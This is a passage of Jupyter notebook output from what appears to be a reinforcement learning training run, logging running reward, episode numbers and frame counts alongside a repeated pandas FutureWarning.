      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 500\t Frame count: 280300\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 500\t Frame count: 280400\t Context: 2\n",
      "Running reward: 11.00\t Episode 500\t Frame count: 280500\t Context: 2\n",
      "Running reward: 11.00\t Episode 501\t Frame count: 280600\t Context: 1\n",
      "Running reward: 11.00\t Episode 501\t Frame count: 280700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 501\t Frame count: 280800\t Context: 1\n",
      "Running reward: 11.00\t Episode 501\t Frame count: 280900\t Context: 1\n",
      "Running reward: 11.00\t Episode 501\t Frame count: 281000\t Context: 1\n",
      "Running reward: 11.00\t Episode 501\t Frame count: 281100\t Context: 2\n",
      "Running reward: 11.00\t Episode 502\t Frame count: 281200\t Context: 1\n",
      "Running reward: 11.00\t Episode 502\t Frame count: 281300\t Context: 1\n",
      "Running reward: 11.00\t Episode 502\t Frame count: 281400\t Context: 1\n",
      "Running reward: 11.00\t Episode 502\t Frame count: 281500\t Context: 1\n",
      "Running reward: 11.00\t Episode 502\t Frame count: 281600\t Context: 1\n",
      "Running reward: 11.00\t Episode 502\t Frame count: 281700\t Context: 1\n",
      "Running reward: 11.00\t Episode 502\t Frame count: 281800\t Context: 2\n",
      "Running reward: 11.00\t Episode 503\t Frame count: 281900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 503\t Frame count: 282000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 504\t Frame count: 282100\t Context: 1\n",
      "Running reward: 11.00\t Episode 504\t Frame count: 282200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 504\t Frame count: 282300\t Context: 1\n",
      "Running reward: 11.00\t Episode 504\t Frame count: 282400\t Context: 1\n",
      "Running reward: 11.00\t Episode 504\t Frame count: 282500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 504\t Frame count: 282600\t Context: 2\n",
      "Running reward: 11.00\t Episode 504\t Frame count: 282700\t Context: 2\n",
      "Running reward: 11.00\t Episode 505\t Frame count: 282800\t Context: 1\n",
      "Running reward: 11.00\t Episode 505\t Frame count: 282900\t Context: 1\n",
      "Running reward: 11.00\t Episode 505\t Frame count: 283000\t Context: 2\n",
      "Running reward: 11.00\t Episode 506\t Frame count: 283100\t Context: 1\n",
      "Running reward: 11.00\t Episode 506\t Frame count: 283200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 506\t Frame count: 283300\t Context: 1\n",
      "Running reward: 11.00\t Episode 506\t Frame count: 283400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 506\t Frame count: 283500\t Context: 1\n",
      "Running reward: 11.00\t Episode 506\t Frame count: 283600\t Context: 1\n",
      "Running reward: 11.00\t Episode 506\t Frame count: 283700\t Context: 1\n",
      "Running reward: 11.00\t Episode 506\t Frame count: 283800\t Context: 1\n",
      "Running reward: 11.00\t Episode 506\t Frame count: 283900\t Context: 2\n",
      "Running reward: 11.00\t Episode 506\t Frame count: 284000\t Context: 2\n",
      "Running reward: 11.00\t Episode 506\t Frame count: 284100\t Context: 2\n",
      "Running reward: 11.00\t Episode 507\t Frame count: 284200\t Context: 1\n",
      "Running reward: 11.00\t Episode 507\t Frame count: 284300\t Context: 1\n",
      "Running reward: 11.00\t Episode 507\t Frame count: 284400\t Context: 1\n",
      "Running reward: 11.00\t Episode 507\t Frame count: 284500\t Context: 1\n",
      "Running reward: 11.00\t Episode 507\t Frame count: 284600\t Context: 2\n",
      "Running reward: 11.00\t Episode 507\t Frame count: 284700\t Context: 2\n",
      "Running reward: 11.00\t Episode 507\t Frame count: 284800\t Context: 2\n",
      "Running reward: 11.00\t Episode 507\t Frame count: 284900\t Context: 2\n",
      "Running reward: 11.00\t Episode 508\t Frame count: 285000\t Context: 1\n",
      "Running reward: 11.00\t Episode 509\t Frame count: 285100\t Context: 1\n",
      "Running reward: 11.00\t Episode 509\t Frame count: 285200\t Context: 1\n",
      "Running reward: 11.00\t Episode 509\t Frame count: 285300\t Context: 1\n",
      "Running reward: 11.00\t Episode 509\t Frame count: 285400\t Context: 1\n",
      "Running reward: 11.00\t Episode 509\t Frame count: 285500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 509\t Frame count: 285600\t Context: 2\n",
      "Running reward: 11.00\t Episode 509\t Frame count: 285700\t Context: 2\n",
      "Running reward: 11.00\t Episode 509\t Frame count: 285800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 510\t Frame count: 285900\t Context: 1\n",
      "Running reward: 11.00\t Episode 510\t Frame count: 286000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 510\t Frame count: 286100\t Context: 1\n",
      "Running reward: 11.00\t Episode 510\t Frame count: 286200\t Context: 1\n",
      "Running reward: 11.00\t Episode 510\t Frame count: 286300\t Context: 1\n",
      "Running reward: 11.00\t Episode 510\t Frame count: 286400\t Context: 1\n",
      "Running reward: 11.00\t Episode 510\t Frame count: 286500\t Context: 1\n",
      "Running reward: 11.00\t Episode 510\t Frame count: 286600\t Context: 1\n",
      "Running reward: 11.00\t Episode 510\t Frame count: 286700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 510\t Frame count: 286800\t Context: 1\n",
      "Running reward: 11.00\t Episode 510\t Frame count: 286900\t Context: 1\n",
      "Running reward: 11.00\t Episode 510\t Frame count: 287000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 511\t Frame count: 287100\t Context: 1\n",
      "Running reward: 11.00\t Episode 511\t Frame count: 287200\t Context: 1\n",
      "Running reward: 11.00\t Episode 511\t Frame count: 287300\t Context: 1\n",
      "Running reward: 11.00\t Episode 511\t Frame count: 287400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 511\t Frame count: 287500\t Context: 1\n",
      "Running reward: 11.00\t Episode 511\t Frame count: 287600\t Context: 1\n",
      "Running reward: 11.00\t Episode 511\t Frame count: 287700\t Context: 2\n",
      "Running reward: 11.00\t Episode 511\t Frame count: 287800\t Context: 2\n",
      "Running reward: 11.00\t Episode 512\t Frame count: 287900\t Context: 1\n",
      "Running reward: 11.00\t Episode 512\t Frame count: 288000\t Context: 1\n",
      "Running reward: 11.00\t Episode 512\t Frame count: 288100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 512\t Frame count: 288200\t Context: 1\n",
      "Running reward: 11.00\t Episode 512\t Frame count: 288300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 512\t Frame count: 288400\t Context: 1\n",
      "Running reward: 11.00\t Episode 512\t Frame count: 288500\t Context: 2\n",
      "Running reward: 11.00\t Episode 512\t Frame count: 288600\t Context: 2\n",
      "Running reward: 11.00\t Episode 512\t Frame count: 288700\t Context: 2\n",
      "Running reward: 11.00\t Episode 512\t Frame count: 288800\t Context: 2\n",
      "Running reward: 11.00\t Episode 513\t Frame count: 288900\t Context: 2\n",
      "Running reward: 11.00\t Episode 513\t Frame count: 289000\t Context: 2\n",
      "Running reward: 11.00\t Episode 513\t Frame count: 289100\t Context: 2\n",
      "Running reward: 11.00\t Episode 513\t Frame count: 289200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 513\t Frame count: 289300\t Context: 2\n",
      "Running reward: 11.00\t Episode 514\t Frame count: 289400\t Context: 1\n",
      "Running reward: 11.00\t Episode 514\t Frame count: 289500\t Context: 2\n",
      "Running reward: 11.00\t Episode 514\t Frame count: 289600\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 515\t Frame count: 289700\t Context: 1\n",
      "Running reward: 11.00\t Episode 515\t Frame count: 289800\t Context: 1\n",
      "Running reward: 11.00\t Episode 515\t Frame count: 289900\t Context: 1\n",
      "Running reward: 11.00\t Episode 515\t Frame count: 290000\t Context: 2\n",
      "Running reward: 11.00\t Episode 515\t Frame count: 290100\t Context: 2\n",
      "Running reward: 11.00\t Episode 515\t Frame count: 290200\t Context: 2\n",
      "Running reward: 11.00\t Episode 515\t Frame count: 290300\t Context: 2\n",
      "Running reward: 11.00\t Episode 515\t Frame count: 290400\t Context: 2\n",
      "Running reward: 11.00\t Episode 515\t Frame count: 290500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 516\t Frame count: 290600\t Context: 1\n",
      "Running reward: 11.00\t Episode 516\t Frame count: 290700\t Context: 1\n",
      "Running reward: 11.00\t Episode 516\t Frame count: 290800\t Context: 1\n",
      "Running reward: 11.00\t Episode 516\t Frame count: 290900\t Context: 1\n",
      "Running reward: 11.00\t Episode 516\t Frame count: 291000\t Context: 2\n",
      "Running reward: 11.00\t Episode 516\t Frame count: 291100\t Context: 2\n",
      "Running reward: 11.00\t Episode 517\t Frame count: 291200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 517\t Frame count: 291300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 517\t Frame count: 291400\t Context: 1\n",
      "Running reward: 11.00\t Episode 517\t Frame count: 291500\t Context: 1\n",
      "Running reward: 11.00\t Episode 517\t Frame count: 291600\t Context: 1\n",
      "Running reward: 11.00\t Episode 517\t Frame count: 291700\t Context: 1\n",
      "Running reward: 11.00\t Episode 517\t Frame count: 291800\t Context: 1\n",
      "Running reward: 11.00\t Episode 517\t Frame count: 291900\t Context: 1\n",
      "Running reward: 11.00\t Episode 517\t Frame count: 292000\t Context: 1\n",
      "Running reward: 11.00\t Episode 517\t Frame count: 292100\t Context: 1\n",
      "Running reward: 11.00\t Episode 517\t Frame count: 292200\t Context: 2\n",
      "Running reward: 11.00\t Episode 517\t Frame count: 292300\t Context: 2\n",
      "Running reward: 11.00\t Episode 517\t Frame count: 292400\t Context: 2\n",
      "Running reward: 11.00\t Episode 517\t Frame count: 292500\t Context: 2\n",
      "Running reward: 11.00\t Episode 517\t Frame count: 292600\t Context: 2\n",
      "Running reward: 11.00\t Episode 517\t Frame count: 292700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 517\t Frame count: 292800\t Context: 2\n",
      "Running reward: 11.00\t Episode 517\t Frame count: 292900\t Context: 2\n",
      "Running reward: 11.00\t Episode 517\t Frame count: 293000\t Context: 2\n",
      "Running reward: 11.00\t Episode 517\t Frame count: 293100\t Context: 2\n",
      "Running reward: 11.00\t Episode 517\t Frame count: 293200\t Context: 2\n",
      "Running reward: 11.00\t Episode 517\t Frame count: 293300\t Context: 2\n",
      "Running reward: 11.00\t Episode 517\t Frame count: 293400\t Context: 2\n",
      "Running reward: 11.00\t Episode 517\t Frame count: 293500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 518\t Frame count: 293600\t Context: 1\n",
      "Running reward: 11.00\t Episode 518\t Frame count: 293700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 518\t Frame count: 293800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 518\t Frame count: 293900\t Context: 1\n",
      "Running reward: 11.00\t Episode 518\t Frame count: 294000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 518\t Frame count: 294100\t Context: 2\n",
      "Running reward: 11.00\t Episode 518\t Frame count: 294200\t Context: 2\n",
      "Running reward: 11.00\t Episode 518\t Frame count: 294300\t Context: 2\n",
      "Running reward: 11.00\t Episode 518\t Frame count: 294400\t Context: 2\n",
      "Running reward: 11.00\t Episode 518\t Frame count: 294500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 519\t Frame count: 294600\t Context: 1\n",
      "Running reward: 11.00\t Episode 519\t Frame count: 294700\t Context: 1\n",
      "Running reward: 11.00\t Episode 519\t Frame count: 294800\t Context: 2\n",
      "Running reward: 11.00\t Episode 519\t Frame count: 294900\t Context: 2\n",
      "Running reward: 11.00\t Episode 519\t Frame count: 295000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 519\t Frame count: 295100\t Context: 2\n",
      "Running reward: 11.00\t Episode 519\t Frame count: 295200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 520\t Frame count: 295300\t Context: 1\n",
      "Running reward: 11.00\t Episode 520\t Frame count: 295400\t Context: 1\n",
      "Running reward: 11.00\t Episode 520\t Frame count: 295500\t Context: 2\n",
      "Running reward: 11.00\t Episode 520\t Frame count: 295600\t Context: 2\n",
      "Running reward: 11.00\t Episode 520\t Frame count: 295700\t Context: 2\n",
      "Running reward: 11.00\t Episode 520\t Frame count: 295800\t Context: 2\n",
      "Running reward: 11.00\t Episode 520\t Frame count: 295900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 521\t Frame count: 296000\t Context: 1\n",
      "Running reward: 11.00\t Episode 521\t Frame count: 296100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 521\t Frame count: 296200\t Context: 1\n",
      "Running reward: 11.00\t Episode 521\t Frame count: 296300\t Context: 1\n",
      "Running reward: 11.00\t Episode 521\t Frame count: 296400\t Context: 1\n",
      "Running reward: 11.00\t Episode 521\t Frame count: 296500\t Context: 2\n",
      "Running reward: 11.00\t Episode 521\t Frame count: 296600\t Context: 2\n",
      "Running reward: 11.00\t Episode 521\t Frame count: 296700\t Context: 2\n",
      "Running reward: 11.00\t Episode 521\t Frame count: 296800\t Context: 2\n",
      "Running reward: 11.00\t Episode 521\t Frame count: 296900\t Context: 2\n",
      "Running reward: 11.00\t Episode 522\t Frame count: 297000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 522\t Frame count: 297100\t Context: 1\n",
      "Running reward: 11.00\t Episode 522\t Frame count: 297200\t Context: 1\n",
      "Running reward: 11.00\t Episode 522\t Frame count: 297300\t Context: 1\n",
      "Running reward: 11.00\t Episode 522\t Frame count: 297400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 522\t Frame count: 297500\t Context: 1\n",
      "Running reward: 11.00\t Episode 522\t Frame count: 297600\t Context: 2\n",
      "Running reward: 11.00\t Episode 522\t Frame count: 297700\t Context: 2\n",
      "Running reward: 11.00\t Episode 523\t Frame count: 297800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 523\t Frame count: 297900\t Context: 2\n",
      "Running reward: 11.00\t Episode 523\t Frame count: 298000\t Context: 2\n",
      "Running reward: 11.00\t Episode 523\t Frame count: 298100\t Context: 2\n",
      "Running reward: 11.00\t Episode 523\t Frame count: 298200\t Context: 2\n",
      "Running reward: 11.00\t Episode 523\t Frame count: 298300\t Context: 2\n",
      "Running reward: 11.00\t Episode 523\t Frame count: 298400\t Context: 2\n",
      "Running reward: 11.00\t Episode 523\t Frame count: 298500\t Context: 2\n",
      "Running reward: 11.00\t Episode 523\t Frame count: 298600\t Context: 2\n",
      "Running reward: 11.00\t Episode 523\t Frame count: 298700\t Context: 2\n",
      "Running reward: 11.00\t Episode 524\t Frame count: 298800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 524\t Frame count: 298900\t Context: 1\n",
      "Running reward: 11.00\t Episode 524\t Frame count: 299000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 524\t Frame count: 299100\t Context: 1\n",
      "Running reward: 11.00\t Episode 524\t Frame count: 299200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 524\t Frame count: 299300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
